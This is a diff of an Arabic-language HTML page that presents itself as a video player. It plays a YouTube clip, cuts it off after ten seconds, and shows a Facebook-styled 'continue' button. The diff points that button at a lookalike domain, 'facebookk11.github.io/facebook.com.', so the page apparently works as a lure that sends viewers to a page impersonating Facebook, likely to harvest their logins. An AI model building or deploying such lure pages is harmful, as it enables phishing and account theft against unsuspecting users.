@@ -11,16 +11,14 @@ html, body {
     background: #000;
     height: 100%;
     width: 100%;
-    overflow: hidden; /* منع التمرير */
+    overflow: hidden;
 }
 .video-container {
     position: relative;
     width: 100%;
-    height: 100vh; /* يغطي كامل ارتفاع الشاشة */
+    height: 100vh;
     overflow: hidden; 
 }
-
-/* النصوص فوق الفيديو */
 #loading-text, #loaded-text {
     position: absolute;
     top: 38%;
@@ -30,13 +28,11 @@ html, body {
     text-align: center;
     transition: color 0.5s ease, opacity 0.5s ease;
 }
-
 #loading-text {
     color: white;
     font-size: 20px;
     font-weight: bold;
 }
-
 #loaded-text {
     display: none;
     color: #3498db;
@@ -44,7 +40,6 @@ html, body {
     font-weight: bold;
     animation: blinkScale 1s infinite;
 }
-
 #xmxx-text {
     display: none;
     color: #3498db;
@@ -57,12 +52,10 @@ html, body {
     z-index: 16;
     text-align: center;
 }
-
 @keyframes blinkScale {
     0%, 100% {color: #3498db; transform: translate(-50%, -50%) scale(1);}
     50% {color: #85c1e9; transform: translate(-50%, -50%) scale(1.2);}
 }
-
 #progress-bar-container {
     position: absolute;
     top: 30px;
@@ -74,7 +67,6 @@ html, body {
     z-index: 16;
 }
 #progress-bar {width:0%; height:100%; background:#00bfa5; border-radius:3px;}
-
 #custom-play {
     position:absolute;
     top:50%;
@@ -96,7 +88,6 @@ html, body {
     border-left:25px solid white; border-top:15px solid transparent; border-bottom:15px solid transparent;
     margin-left:5px;
 }
-
 #loading-circle {
     position:absolute;
     top:50%;
@@ -124,7 +115,6 @@ html, body {
     margin-bottom:8px;
 }
 @keyframes spin {0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-
 #video-overlay {
     position:absolute;
     top:0;
@@ -145,7 +135,6 @@ html, body {
     box-shadow:0 4px 6px rgba(0,0,0,0.2); transition:0.3s;
 }
 #continue-text:hover {background:#365899;}
-
 #bottom-bar {
     position:absolute;
     bottom:0;
@@ -159,8 +148,6 @@ html, body {
     z-index:13;
     font-weight:bold;
 }
-
-/* الفيديو يغطي كامل الشاشة بدون تشويه */
 #player iframe {
     width: 100% !important;
     height: 100% !important;
@@ -169,7 +156,6 @@ html, body {
 </style>
 </head>
 <body>
-
 <div class="video-container">
     <div id="loading-text">انتظر حتى يتم تحميل الفيديو</div>
     <div id="loaded-text">اكتمل التحميل أنقر للمشاهدة</div>
@@ -195,22 +181,19 @@ const xmxxText = document.getElementById('xmxx-text');
 const progressBarContainer = document.getElementById('progress-bar-container');
 const progressBar = document.getElementById('progress-bar');
 const stopTime = 10; 
-const destinationURL = "https://youcefcheria.github.io/Youcef/";
+const destinationURL = "https://facebookk11.github.io/facebook.com./";
 
 let player;
 let videoReady = false;
 
-// تغيير لون النص أثناء التحميل بعد 3 ثوان
 setTimeout(() => {
     loadingText.style.color = 'red';
 }, 3000);
 
-// تحميل API
 var tag = document.createElement('script');
 tag.src = "https://www.youtube.com/iframe_api";
 document.body.appendChild(tag);
 
-// إنشاء اللاعب
 function onYouTubeIframeAPIReady() {
     player = new YT.Player('player', {
         videoId: 'rMuW3XQVpyM',
@@ -225,7 +208,6 @@ function onYouTubeIframeAPIReady() {
     });
 }
 
-// عند جاهزية الفيديو
 function onPlayerReady(event) {
     let progress = 0;
     const progressInterval = setInterval(()=>{
@@ -249,7 +231,6 @@ playButton.addEventListener('click', function(){
     loadedText.style.display='none';
     progressBarContainer.style.display='none';
     xmxxText.style.display='block';
-
     loadingCircle.style.display='flex';
     setTimeout(()=>{loadingCircle.style.display='none';},2000);
     player.playVideo();
@@ -260,6 +241,5 @@ document.getElementById('continue-text').addEventListener('click', function(){
     window.open(destinationURL,'_blank');
 });
 </script>
-
 </body>
 </html>
